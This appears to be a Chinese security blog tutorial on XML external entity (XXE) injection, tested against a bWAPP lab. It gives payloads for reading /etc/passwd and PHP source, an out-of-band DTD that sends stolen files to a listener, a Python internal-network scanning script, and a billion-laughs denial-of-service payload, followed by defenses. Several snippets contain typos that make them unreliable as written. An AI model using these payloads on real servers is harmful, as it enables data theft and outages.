@@ -1,0 +1,551 @@
+# XXE从入门到放弃
+
+阅读量 **1427640**
+
+|评论 **1**
+
+发布时间 : 2020-01-19 10:30:35
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p4.ssl.qhimg.com/t018543ef8b23734f4d.png)
+
+## 认识XML和XXE
+
+XXE全称XML External Entity
+Injection，也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，肯定要先了解XML语法规则和外部实体的定义及调用形式。
+
+### XML基础知识
+
+XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。
+
+### XML语法规则如下：
+
+  1. **所有的XML** **元素都必须有一个关闭标签**
+  2. **XML** **标签对大小写敏感**
+  3. **XML** **必须正确嵌套**
+  4. **XML** **属性值必须加引号””**
+  5. **实体引用** （在标签属性，以及对应的位置值可能会出现<>符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应html的实体对应的表示，比如<傅好对应的实体就是lt，>符号对应的实体就是gt）
+  6. **在XML** **中，空格会被保留** （案例如：<p>a空格B</p>，这时候a和B之间的空格就会被保留）
+
+    
+    
+    <?xml version="1.0" encoding="UTF-8"?>  //xml声明
+    
+    <!DOCTYPE copyright [        //DTD(文档类型定义)
+    
+    <!ELEMENT note (to,reset,login)>   //定义元素
+    
+    <!ENTITY test SYSTEM "url">        //定义外部实体test
+    
+    ]>
+    
+    <to>
+    
+    <reset>                    //下面为文档元素
+    
+      <login>&test;</login>            //调用test实体（此步骤不可缺）
+    
+      <secret>login</secret>
+    
+    </reset>
+    
+    <to>
+
+### XML元素介绍
+
+XML元素是指从（且包括）开始标签直到（且包括）结束标签的部分。
+
+每个元素又有可以有对应的属性。XML属性必须加引号。
+
+注意：
+
+  1. **XML** **文档必须有一个根元素**
+  2. **XML** **元素都必须有一个关闭标签**
+  3. **XML** **标签对大小写敏感**
+  4. **XML** **元素必须被正确的嵌套**
+  5. **XML** **属性值必须加引号**
+
+![](https://p5.ssl.qhimg.com/t0141e553155d326986.png)
+
+### XML DTD介绍
+
+DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。
+
+    
+    
+    <?xml version="1.0" encoding="utf-8" ?> 
+    
+    <!DOCTYPE 学生名册 [
+    
+    <!ELEMENT 学生名册 (学生+)> 
+    
+    <!ELEMENT 学生 (姓名,性别,年龄)>
+    
+    <!ELEMENT 姓名 (#PCDATA)> 
+    
+    <!ELEMENT 性别 (#PCDATA)>
+    
+    <!ELEMENT 年龄 (#PCDATA)> 
+    
+    <!ATTLIST 学生 学号 ID #REQUIRED>
+    
+    ]>
+    
+    <学生名册>  
+    
+        <学生 学号="a1">
+    
+    <姓名>张三</姓名>
+    
+    <性别>男</性别>
+    
+    <年龄>20</年龄>  
+    
+    </学生>
+    
+    <学生 学号="a2">
+    
+    <姓名>李四</姓名>
+    
+    <性别>男</性别>
+    
+    <年龄>24</年龄>
+    
+    </学生>
+    
+    <学生名册>
+
+![](https://p5.ssl.qhimg.com/t013637e2ad5fbd15af.png)
+
+**DTD是什么？**
+
+XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD文档类型定义（document type definition） 的东西控制的。
+
+DTD用来描述xml文档的结构，一个DTD文档包含：
+
+元素的定义规则；元素之间的关系规则；属性的定义规则。
+
+DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
+
+他就是长得下面这个样子：
+
+**内部的 DOCTYPE 声明**
+
+内部声明DTD类型
+
+内部声明DTD类型声明：<!DOCTYPE 根元素[子 元素声明]>
+
+    
+    
+    <!DOCTYPE 根元素[子   元素声明]>
+    
+    
+    
+    <?xml version="1.0" encoding="UTF-8"?>  //xml声明
+    
+    <!DOCTYPE note[        //DTD(文档类型定义)
+    
+    <!ELEMENT note (to,from,login)>   //定义元素
+    
+    <!ELEMENT to (#PCDATA)>
+    
+    <!ELEMENT from(#PCDATA)>
+    
+    <!ELEMENT login (#PCDATA)>        //定义外部实体test
+    
+    ]>
+    
+    <note>
+    
+    <to></to>
+    
+    <from>                    </from>
+    
+    <login>&test;</login> 
+
+![](https://p3.ssl.qhimg.com/t01a3f1c9293bb748e8.png)
+
+**引用外部实体：**
+
+我们主要关注XML外部实体的定义和调用方式：
+
+    
+    
+    <!ENTITY 实体名称 SYSTEM "URI"> 
+    
+    <?xml version="1.0" encoding="gb2312"?>
+    
+    <！DOCTYPE students SYSTEM "StudentDTD.dtd">
+    
+       <students>    
+    
+          <student sno="_0010">        
+    
+             <name>Mark</name>        
+    
+             <age>23</age>        
+    
+             <course>English</course>        
+    
+             <course>Math</course>    
+    
+         </student>    
+    
+         <student sno="_0109" role="student">        
+    
+            <name sex="Male">Andy</name>        
+    
+            <age>19</age>        
+    
+            <course>Chinese</course>        
+    
+            <school>&school;</school>    
+    
+         </student>
+    
+    </students>
+
+**DTD数据类型**
+
+PCDATA的意思是被解析的字符数据/
+
+PCDATA的意思是被解析的字符数据，PCDATA是会被解析器解析的文本
+
+CDATA的意思是字符数据
+
+CDATA是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。
+
+**DTD** **实体介绍**
+
+（实体定义）
+
+实体是用于定义引用普通文本或者特殊字符的快捷方式的变量
+
+在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其它实体都以字符（&）开始，以字符（;）结束。
+
+**内部实体：**
+
+    
+    
+    <!ENTITY 实体名称 "实体的值">
+
+**外部实体：**
+
+    
+    
+    <!ENTITY 实体名称 SYSTEM "URI/URL">
+
+**外部参数实体：**
+
+    
+    
+    <!ENTITY % 实体名 "实体内容”>
+
+### XML注入产生的原理
+
+XXE漏洞全称XML External Entity
+Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。
+
+xxe漏洞触发的点往往是可以上传XML文件约位置，没有对上传的XML文件进行过滤，导致可以上传恶意的XML文件。
+
+**怎么判断网站是否存在XXE漏洞**
+
+最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞，接下来，来看一个小小的展示：
+
+这个是测试xxe的测试点：http://169.254.4.52/bWAPP/xxe-1.php
+
+我们点击下面的Any bugs然后用burp抓包
+
+我们随便输入下
+
+从上面我们可以看到，web应用正在解析xml的内容，接受用户特定或者自定义的输入，然后呈现给用户。为了验证，我们可以构造如下的输入：
+
+    
+    
+    <?xml version="1.0" encoding="utf-8"?>
+    
+    <!DOCTYPE test[
+    
+    <!ENTITY test "testtest">]>
+    
+    
+    
+    <reset><login>bee33333;&test;</login><secret>Any bugs?</secret></reset>
+
+可以看到应用程序确实是直接解析了xml，那么如果xml文档中有一个参数是用来调用远程服务器的内容？这个参数是可控的,我们可以做什么？
+
+**XXE漏洞-文件读取**
+
+PHP中测试POC
+
+[File:///path/to/file.ext](File:///%5C%5Cpath%5Cto%5Cfile.ext)
+
+<http://url/file.ext>
+
+PHP://filter/read=convert.base64-encode/resource=/home/bee/test.php
+
+**读取文档**
+
+**有回显的xxe利用**
+
+Payload:
+
+    
+    
+    <?xml version="1.0" encoding="utf-8" ?>
+    
+    <!DOCTYPE xxe[
+    
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    
+    〈xxe>&xxe;</xxe>
+
+**读取php文件**
+
+直接读取php文件会报错，因为php文件里面有<>//等特殊字符，xml解析时候会当成xml语法来解析。这时候就分不清处哪个是真正的xml语句了，
+
+直接利用file协议读取PHP文件，就会产生报错。那么需要base64编码来读取，
+
+Payload：
+
+    
+    
+    <?xml version="1.0" encoding="utf-8" ?>
+    
+    <!DOCTYPE xxe[
+    
+    <!ENTITY xxe SYSTEM "PHP://filter/read=convert.base64-encode/resource=/home/bee/test.php">]>
+
+![](https://p1.ssl.qhimg.com/t01b3b9e6918d232b4e.png)
+
+进行解密后得到对应内容
+
+**本地测试无回显注入读取文件**
+
+但是，在实际情况中，大多数情况下服务器上的 XML
+并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据
+
+先看一下漏洞示例：
+
+相较于前面有回显的漏洞代码，我们去掉了内容输出的一部分。这样，用之前的payload就没有作用了：
+
+Payload的构造：
+
+有了前面使用外部DTD文件来拼接内部DTD的参数实体的经验，我们可以知道，通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来，那么我们就可以有这样的设想：
+
+  1. 客户端发送payload 1给web服务器
+  2. web服务器向vps获取恶意DTD，并执行文件读取payload2
+  3. web服务器带着回显结果访问VPS上特定的FTP或者HTTP
+  4. 通过VPS获得回显（nc监听端口）
+
+首先，我们使用ncat监听一个端口：
+
+也可以用python创建一个建议的http服务。
+
+    
+    
+    python -m SimpleHTTPServer 端口
+
+然后，我们构造payload：
+
+我们选择使用外部DTD，在我们自己所能掌控（或是自己搭建）的主机上编写一个dtd文件：
+
+    
+    
+    <!ENTITY % file SYSTEM “PHP://filter/read=convert.base64-encode/resource=/etc/passwd”>
+    
+    <!ENTITY % all “<!ENTITY send SYSTEM ‘监听的url+端口/?file;’>”>
+    
+    %all;
+
+我们注意到，第一个参数实体的声明中使用到了php的base64编码，这样是为了尽量避免由于文件内容的特殊性，产生xml解析器错误。
+
+Payload如下：
+
+    
+    
+    <?xml version=”1.0” encoding=”utf-8” ?>
+    
+    <!DDOCTYPE root SYSTEM “dtd文件”>
+    
+    <root>&send;</root>
+
+如图，我们先声明一个外部的DTD引用，然后再xml文档内容中引用外部DTD中的一般实体。
+
+开始攻击：
+
+然后查看我们的端口监听情况，会发现我们收到了一个连接请求，问号后面的内容就是我们读取到的文件内容经过编码后的字符串：
+
+Ps：
+
+有时候也会出现报错的情况（这是我们在漏洞的代码中没有屏蔽错误和警告），比如我们这里的payload没有选用php的base64编码，这里报错了，但是同时也将所读取的内容爆了出来，只是特殊字符经过了HTML实体编码。
+
+**内网探测**
+
+xxe 由于可以访问外部 url，也就有类似 ssrf 的攻击效果，同样的，也可以利用 xxe 来进行内网探测。
+
+可以先通过 file 协议读取一些配置文件来判断内网的配置以及规模，以便于编写脚本来探测内网。
+
+一个 python 脚本实例：
+
+    
+    
+    import requests
+    
+    import base64
+    
+    
+    
+    #Origtional XML that the server accepts
+    
+    #<xml>
+    
+    #    <stuff>user</stuff>
+    
+    #</xml>
+    
+    
+    
+    def build_xml(string):
+    
+        xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
+    
+        xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
+    
+        xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
+    
+        xml = xml + "\r\n" + """<xml>"""
+    
+        xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
+    
+        xml = xml + "\r\n" + """</xml>"""
+    
+        send_xml(xml)
+    
+    def send_xml(xml):
+    
+        headers = {'Content-Type': 'application/xml'}
+    
+        x = requests.post('http://127.0.0.1/xml.php', data=xml, headers=headers, timeout=5).text
+    
+        coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
+    
+        print coded_string
+    
+    #   print base64.b64decode(coded_string)
+    
+    for i in range(1, 255):
+    
+        try:
+    
+            i = str(i)
+    
+            ip = '192.168.1.' + i
+    
+            string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
+    
+            print string
+    
+            build_xml(string)
+    
+        except:
+    
+          print "error"
+    
+    continue
+
+运行起来大概是这样
+
+**DDOS攻击**
+
+    
+    
+    <?xml version="1.0"?>
+    
+    <!DOCTYPE lolz [
+    
+      <!ENTITY lol "abc">
+    
+      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+    
+      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+    
+      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+    
+      <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+    
+      <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+    
+      <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+    
+      <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+    
+      <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+    
+    ]>
+    
+    <lolz>&lol9;</lolz>
+
+该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”abc”字符串，从而导致 DDoS
+攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。
+
+### 影响:
+
+此漏洞非常危险, 因为此漏洞会造成服务器上敏感数据的泄露，和潜在的服务器拒绝服务攻击。
+
+## 防御方法：
+
+  1. 禁用外部实体
+  2. 过滤和验证用户提交的XML数据
+  3. 不允许XML中含有任何自己声明的DTD
+  4. 有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可
+
+参考文章如下：
+
+<https://www.cnblogs.com/backlion/p/9302528.html>
+
+<https://www.freebuf.com/vuls/175451.htmls>
+
+<https://mp.weixin.qq.com/s/VWofHp5lJLYnbw01copnkw>
+
+<https://www.freebuf.com/articles/web/97833.html>
+
+https://www.freebuf.com/articles/web/86007.html
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Gcow安全团队** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/197423](/post/id/197423)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [XXE](/tag/XXE)
+  * [Web安全](/tag/Web安全)
+
+ **+1** __16赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t0143ca032175423a1f.png) Gcow安全团队
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
